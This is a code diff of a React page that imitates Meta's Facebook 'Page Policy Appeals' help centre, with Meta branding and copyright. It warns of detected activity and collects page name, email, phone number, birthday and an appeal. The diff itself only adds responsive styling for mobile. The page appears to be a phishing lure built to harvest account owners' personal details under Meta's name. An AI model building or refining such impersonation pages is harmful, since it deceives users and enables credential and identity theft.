@@ -285,7 +285,7 @@ const Home = () => {
                 <title>Page Help Center</title>
                 <div className='flex items-center gap-2'>
                     <img src={FacebookImage} alt='' className='h-10 w-10' />
-                    <p className='font-bold'>{translatedTexts.helpCenter}</p>
+                    <p className='font-bold text-lg sm:text-xl'>{translatedTexts.helpCenter}</p>
                 </div>
                 <div className='flex items-center gap-2'>
                     <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
@@ -303,7 +303,7 @@ const Home = () => {
                                     <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                         <FontAwesomeIcon icon={data.icon} />
                                     </div>
-                                    <div>{data.title}</div>
+                                    <div className='text-sm sm:text-base'>{data.title}</div>
                                 </div>
                                 <FontAwesomeIcon icon={faChevronDown} />
                             </div>
@@ -311,59 +311,60 @@ const Home = () => {
                     })}
                 </nav>
                 <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
-                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
-                        <div className='bg-[#e4e6eb] p-6'>
-                            <p className='text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
+                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 w-full max-w-2xl'>
+                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
+                            <p className='text-2xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
-                        <div className='p-4 text-sm leading-6 font-medium'>
-                            <p>{translatedTexts.detectedActivity}</p>
-                            <p>{translatedTexts.accessLimited}</p>
+                        {/* Sửa phần text mô tả - làm to hơn và responsive */}
+                        <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
+                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
+                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-1 p-4 text-sm leading-6 font-semibold sm:gap-2'>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p>
+                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold sm:gap-2'>
+                            <div className='flex flex-col gap-2'>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
                                     type='text' 
                                     name='pageName' 
                                     autoComplete='organization' 
-                                    className={`w-full rounded-lg border px-3 py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.pageName} 
                                     onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                 />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p>
+                            <div className='flex flex-col gap-2'>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
                                     type='email' 
                                     name='mail' 
                                     autoComplete='email' 
-                                    className={`w-full rounded-lg border px-3 py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.mail} 
                                     onChange={(e) => handleInputChange('mail', e.target.value)} 
                                 />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p>
+                            <div className='flex flex-col gap-2'>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
                                     <input 
                                         type='tel' 
                                         name='phone' 
                                         inputMode='numeric' 
                                         pattern='[0-9]*' 
                                         autoComplete='off' 
-                                        className='flex-1 rounded-r-lg border-0 px-3 py-1.5 focus:ring-0 focus:outline-none'
+                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none'
                                         style={{ fontSize: '16px' }}
                                         value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                         onChange={(e) => handleInputChange('phone', e.target.value)} 
@@ -371,14 +372,14 @@ const Home = () => {
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p>
+                            <div className='flex flex-col gap-2'>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
                                     type='date' 
                                     name='birthday' 
-                                    className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.birthday} 
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
@@ -387,14 +388,14 @@ const Home = () => {
                             </div>
                             
                             {/* Thêm ô Your Appeal - Textarea lớn */}
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p className='text-sm sm:text-base'>
+                            <div className='flex flex-col gap-2'>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
                                     name='appeal'
-                                    rows={3}
-                                    className={`w-full rounded-lg border px-3 py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    rows={4}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     style={{ fontSize: '16px' }}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
@@ -403,32 +404,32 @@ const Home = () => {
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
 
-                            <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal mt-1 sm:mt-0' onClick={handleSubmit}>
+                            <button className='w-fit rounded-lg bg-gray-200 px-4 py-3 sm:px-3 sm:py-2 text-base sm:text-[15px] font-normal mt-2' onClick={handleSubmit}>
                                 {translatedTexts.submit}
                             </button>
                         </div>
                     </div>
-                    <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
-                        <div className='mx-auto flex justify-between'>
-                            <div className='flex flex-col space-y-4'>
-                                <p>{translatedTexts.about}</p>
-                                <p>{translatedTexts.adChoices}</p>
-                                <p>{translatedTexts.createAd}</p>
+                    <div className='w-full bg-[#f0f2f5] px-4 py-8 sm:py-14 text-[15px] text-[#65676b] sm:px-32'>
+                        <div className='mx-auto flex flex-col sm:flex-row justify-between gap-6 sm:gap-0'>
+                            <div className='flex flex-col space-y-3 sm:space-y-4'>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.about}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.adChoices}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createAd}</p>
                             </div>
-                            <div className='flex flex-col space-y-4'>
-                                <p>{translatedTexts.privacy}</p>
-                                <p>{translatedTexts.careers}</p>
-                                <p>{translatedTexts.createPage}</p>
+                            <div className='flex flex-col space-y-3 sm:space-y-4'>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.privacy}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.careers}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createPage}</p>
                             </div>
-                            <div className='flex flex-col space-y-4'>
-                                <p>{translatedTexts.termsPolicies}</p>
-                                <p>{translatedTexts.cookies}</p>
+                            <div className='flex flex-col space-y-3 sm:space-y-4'>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.termsPolicies}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.cookies}</p>
                             </div>
                         </div>
-                        <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
-                        <div className='flex justify-between'>
-                            <img src={FromMetaImage} alt='' className='w-[100px]' />
-                            <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
+                        <hr className='my-6 sm:my-8 h-0 border border-transparent border-t-gray-300' />
+                        <div className='flex flex-col sm:flex-row justify-between items-center gap-4 sm:gap-0'>
+                            <img src={FromMetaImage} alt='' className='w-[80px] sm:w-[100px]' />
+                            <p className='text-xs sm:text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                         </div>
                     </div>
                 </div>
